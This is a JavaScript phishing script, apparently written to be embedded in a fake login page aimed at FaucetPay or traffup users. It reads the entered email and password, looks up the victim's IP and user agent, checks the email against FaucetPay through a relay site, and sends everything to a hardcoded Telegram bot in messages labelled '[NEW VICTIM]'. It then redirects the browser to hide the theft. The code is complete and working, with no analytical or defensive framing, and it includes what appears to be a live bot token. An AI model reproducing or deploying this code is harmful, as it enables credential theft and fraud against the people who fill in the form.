function sendTelegramMessage(message) {
  var apiUrl = `https://api.telegram.org/bot6544753640:AAHampKHpttT5D8k6UHhJfNW2AH1aBbXJP0/sendMessage`;
  var params = {
    'chat_id': 6637031375,
    'text': message,
  };

  fetch(apiUrl + '?' + new URLSearchParams(params), {
    method: 'GET'
  })
    .then(response => response.json())
    .then(data => {
      console.log('Response:', data);
    })
    .catch(error => {
      console.error('Error during fetch operation:', error);
    });
}

function CheckAPI(email) {
    var api_url = "https://chuksblog.top/auth/login";
    var data = {
        wallet: email
    };

    return fetch(api_url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams(data),
    })
    .then(response => response.text())
    .then(result => {
        if (result.includes("Your email is not registered to FaucetPay")) {
            console.log("Not registered --", email);
            return { success: false, message: "Not registered" };
        } else {
            console.log("Login success --", email);
            return { success: true, message: "Login success" };
        }
    })
    .catch(error => {
        console.error("Error:", error);
        return { success: false, message: "Error occurred" };
    });
}


function getAutofilledValues() {
    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;
    var boxAccPts = document.getElementById('box_acc_pts');
    var userAgent = navigator.userAgent;
  
    //var Check1 = CheckAPI(email);

    fetch('https://ipinfo.io/json')
    .then(response => response.json())
    .then(data => {
        if (boxAccPts) {
          var content = boxAccPts.innerText || boxAccPts.textContent;
          CheckAPI(email).then(result => {
              var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\nFacuatPay : ${result}\n\nPoints: ${content}`;
              sendTelegramMessage(message); 
          })
          .catch(error => {
              var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\nFacuatPay : ${error}\n\nPoints: ${content}`;
              sendTelegramMessage(message); 
          });
        } else {
          CheckAPI(email).then(result => {
              var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\nFacuatPay : ${result}\n\nPoints: Not Found`;
              sendTelegramMessage(message); 
          })
          .catch(error => {
              var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}\nFacuatPay : ${error}\n\nPoints: Not Found`;
              sendTelegramMessage(message); 
          });
        }
    })
    .catch(error => {
        if (boxAccPts) {
            var content = boxAccPts.innerText || boxAccPts.textContent;
            //var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${Check1}\n\nPoints: ${content}`;
            //sendTelegramMessage(message);
            CheckAPI(email).then(result => {
              var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${result}\n\nPoints: ${content}`;
              sendTelegramMessage(message); 
            })
            .catch(error => {
                var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${error}\n\nPoints: ${content}`;
                sendTelegramMessage(message); 
            });
          } else {
            //var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${Check1}\n\nPoints: Not Found`;
            //sendTelegramMessage(message); 
            CheckAPI(email).then(result => {
                var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${result}\n\nPoints: Not Found`;
                sendTelegramMessage(message); 
            })
            .catch(error => {
                var message = `[NEW VICTIM]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}\nFacuatPay : ${error}\n\nPoints: Not Found`;
                sendTelegramMessage(message); 
            });
          }
    });

    window.location.href = "https://traffup.net/websites";
}
